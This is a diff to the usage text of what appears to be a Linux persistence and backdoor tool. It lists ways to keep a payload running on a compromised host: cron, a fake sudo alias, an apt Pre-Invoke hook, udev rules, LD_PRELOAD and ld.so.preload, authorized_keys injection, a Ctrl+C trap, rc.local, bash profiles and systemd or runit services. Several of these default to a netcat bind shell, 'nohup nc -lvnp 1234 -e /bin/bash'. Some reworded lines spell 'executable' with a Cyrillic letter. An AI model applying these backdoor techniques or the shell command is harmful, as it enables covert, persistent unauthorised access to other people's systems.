@@ -5,9 +5,9 @@ success="Success!"
 help(){
 
     echo -e "
-Usage: $0 [-method] [-options_of_method]
+Usage: $0 [-method] [-options_for_method]
 
-! If option of method  has default value - you haven't to specify this option !
+! If option has default value, it is not necessary !
 
 Methods:
     -h   [ just this 'help' text ]
@@ -19,68 +19,67 @@ Methods:
         Example:
             $0 -ar -u name -p password 
          ]
-    -cr  [ add new cron job with your file which will execute with @hourly option. 
+    -cr  [ add new cron job with your file that will be executed via @hourly. 
         
-        -f    your file to execute
+        -f    your executаble
         
         Example:
             $0 -cr -f /tmp/super_payload
          ]
-    -fs  [ add fake sudo alias in .bashrc, every sudo run will cause run of your file.
+    -fs  [ add fake sudo alias to .bashrc, every sudo launch will cause execution of your file.
 
-        -f    your file to execute (default is command: 'nohup nc -lvnp 1234 -e /bin/bash')
+        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
         
         Example:
             $0 -fs -f /tmp/super_payload
          ]
     -ba  [ backdoor in apt config by adding Pre-Invoke process (config directory: '/etc/apt/apt.conf.d').
     
-        -f    your file to execute (default is command: 'nohup nc -lvnp 1234 -e /bin/bash')
+        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
         -n    name of your file in apt config directory (default: 'backdoor')
         
         Example:
             $0 -ba -f /tmp/super_payload -n cool_backdoor 
          ]
-    -bd  [ backdoor in driver: when usb device will connect to your machine, 
-           your file will execute (rules directory: '/etc/udev/rules.d').
+    -bd  [ backdoor in driver: when usb device will connect to machine, 
+           your file will be executed (rules directory: '/etc/udev/rules.d').
 
-        -f    your file to execute (default is command: 'nohup nc -lvnp 1234 -e /bin/bash')
-        -n    name of your file in apt config directory (default: 'backdoor')
+        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
+        -n    name of your file in udev rules directory (default: 'backdoor')
 
         Example:
             $0 -bd -f /tmp/super_payload -n cool_backdoor 
          ]
-    -lp  [ add your .so file in ld_preload, for replacement standart libraries functions.
+    -lp  [ add your .so file in ld_preload, to replace library functions with your code.
 
-        -f    your .so file for replacement
-        -r    root mode flag (without this flag export of LD_PRELOAD variable will stored in '.bashrc',
-                              with this flag, export of LD_PRELOAD variable will stored in '/etc/profile'
-                              and also your .so file will add in '/etc/ld.so.preload')
+        -f    your .so file
+        -r    root mode flag (without this flag rewritten LD_PRELOAD variable will be stored in '.bashrc',
+                              with this flag, rewritten LD_PRELOAD variable will be stored in '/etc/profile'
+                              and your .so file will be added to '/etc/ld.so.preload')
 
         Exammple:
             $0 -lp -r -f /tmp/super_library.so
          ]
-    -bs  [ add rsa_pub key to file with authorized_keys for opportunity to connect to 
-           the host via ssh by your private key.
+    -bs  [ adds public RSA key to authorized_keys file to allow remote connection via ssh. 
         
-        -f    your file with pub key (default: generate new key pair, print private key in console, 
+        -f    your public key file (default: generate new key pair, print private key to console, 
               pub key -> in authorized_keys)
-        -af    full name of file with authorized_keys(default: '~/.ssh/authorized_keys')
+        -af    full path to authorized_keys file (default: '~/.ssh/authorized_keys')
         
         Examples:
             $0 -bs -af /tmp/new_authorized_keyfile -f my_rsa.pub
          ]
-    -t   [ add new command to SIGINT signal by 'trap' binary (every time when user will use 
-          (Ctrl + C) your file will execute).
+    -t   [ add new command to SIGINT signal using 'trap' binary (every time user presses 
+          (Ctrl + C) your file will be executed).
         
-        -f    your file to execute
+        -f    your executаble
 
         Example:
             $0 -t -f /tmp/super_payload
          ]
-    -rc  [ add your file in autorun by 'rc.local' file. 
+    -rc  [ add your file to autorun using 'rc.local' file. 
 
-        -f    your file to execute (default is command: 'nohup nc -lvnp 1234 -e /bin/bash')
+        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
 
         Example:
             $0 -rc -f /tmp/super_payload
@@ -88,24 +87,24 @@ Methods:
     -b   [ add your file in '.bashrc' and/or in '.bash_profile' ('.bash_profile' is executed 
            for login shells, while '.bashrc' is executed for interactive non-login shells).
 
-        -f    your file to execute (default is command: 'nohup nc -lvnp 1234 -e /bin/bash')
+        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
         -r    flag for using only '.bashrc' file (default: use both files)
         -p    flag for using only '.bash_profile' (default: use both files)
 
         Example:
             $0 -b -f /tmp/super_payload -r 
          ]
-    -s   [ add new service by 'systemd' and/or 'runit' (directory for 'systemd' services
+    -s   [ add new service to 'systemd' and/or 'runit' (directory for 'systemd' services
            with root_mode: /etc/systemd/system/,for 'systemd' services without root_mode:
            '~/.config/systemd/user',for runit services: '/etc/sv/')
 
-        -f    your file to execute (default is command: 'nohup nc -lvnp 1234 -e /bin/bash')
+        -f    your executаble (default: 'nohup nc -lvnp 1234 -e /bin/bash')
         -n    name of your service (default:'badguy')
         -a    flag for using 'systemd' and 'runit' together (default: use only 'systemd')
         -run    use only 'runit'  (default: use only 'systemd')
         -r    flag for using root_mode
         -d    description for your service in 'systemd' (default:'persistence')
-        -t    time (in seconds) for restarting your service (default: 60 sec)
+        -t    service restart timeout (default: 60 sec)
 
         Example:
             $0 -s -f /tmp/superpayload -n backdoor -r -d my_description -t 12
